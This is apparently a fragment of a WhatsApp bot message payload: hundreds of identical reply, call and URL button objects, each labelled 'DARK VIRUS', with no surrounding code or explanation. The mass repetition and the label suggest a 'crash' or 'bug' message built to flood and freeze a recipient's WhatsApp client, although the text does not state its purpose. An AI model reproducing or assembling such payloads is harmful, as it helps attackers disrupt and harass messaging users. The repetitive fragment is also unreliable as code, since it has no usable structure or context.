{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
